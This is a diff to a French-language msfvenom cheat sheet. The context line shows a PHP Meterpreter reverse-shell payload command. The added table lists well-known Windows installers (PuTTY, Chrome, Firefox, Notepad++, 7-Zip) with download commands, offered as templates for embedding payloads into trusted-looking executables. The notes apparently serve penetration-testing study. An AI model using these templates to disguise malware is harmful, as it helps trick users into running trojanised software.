@@ -266,6 +266,19 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=7000 -f raw >
 | `-n` | Ajoute des NOP sled | `-n 32` (32 NOPs) |
 
 ---
+## Voici la liste des templates que tu peux utiliser pour personnaliser tes payloads avec `msfvenom`.
+
+| Template | Commande de téléchargement | Remarques |
+| :--- | :--- | :--- |
+| **Putty (64-bit)** | `wget -4 -O /root/putty.exe "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"` | Léger (~500KB), recommandé. |
+| **Putty (32-bit)** | `wget -4 -O /root/putty32.exe "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe"` | Version 32-bit, utile pour Shellter. |
+| **Chrome** | `wget -4 -O /root/ChromeSetup.exe "https://dl.google.com/chrome/install/latest/chrome_installer.exe"` | Très connu, mais plus lourd (~20MB). |
+| **Firefox** | `wget -4 -O /root/FirefoxInstaller.exe "https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=fr"` | Alternative à Chrome, également fiable. |
+| **Notepad++** | `wget -4 -O /root/npp.exe "https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.5.4/npp.8.5.4.Installer.exe"` | Très léger et légitime. |
+| **7-Zip** | `wget -4 -O /root/7z.exe "https://www.7-zip.org/a/7z2201.exe"` | Petit utilitaire de compression. |
+| **Fichiers système (write.exe)** | *(Fichier déjà présent dans Windows)* | Utiliser `write.exe` ou `notepad.exe` directement via leur chemin système. |
+
+
 
 ## COMMANDES MSFVENOM (Du moins puissant au plus puissant)
 
